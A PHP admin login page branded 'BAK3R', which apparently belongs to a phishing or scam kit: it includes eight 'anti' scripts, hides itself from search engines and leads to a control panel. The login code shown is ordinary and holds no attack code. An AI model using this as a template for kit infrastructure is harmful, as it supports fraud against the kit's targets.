<?php 
error_reporting(0);
session_start();
require_once "bak3r.php";
include "./anti/anti1.php";
include "./anti/anti2.php";
include "./anti/anti3.php";
include "./anti/anti4.php";
include "./anti/anti5.php";
include "./anti/anti6.php";
include "./anti/anti7.php";
include "./anti/anti8.php";

// Redirect to panel if already logged in
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
    header("Location: control-panel.php");
    exit;
}

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Verify credentials
    if ($username === ADMIN_USERNAME && password_verify($password, ADMIN_PASSWORD_HASH)) {
        $_SESSION['loggedin'] = true;
        header("Location: control-panel.php");
        exit;
    } else {
        $login_error = "Invalid username or password";
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="./media/login.css">
</head>

<body>
    <div class="login-box">
        <h2 class="login-title">Login</h2>

        <?php if (isset($login_error)): ?>
        <div class="login-error">
            <?php echo htmlspecialchars($login_error); ?>
        </div>
        <?php endif; ?>

        <form method="post" action="" class="login-form">
            <div class="form-field">
                <input type="text" class="form-input" name="username" placeholder="Username" required>
            </div>
            <div class="form-field">
                <input type="password" class="form-input" name="password" placeholder="Password" required>
            </div>
            <button type="submit" name="login" class="login-button">Login</button>
        </form>

        <div class="login-footer">𝔹𝔸𝕂3ℝ • &copy; <?php echo date("Y"); ?></div>
    </div>
</body>

</html>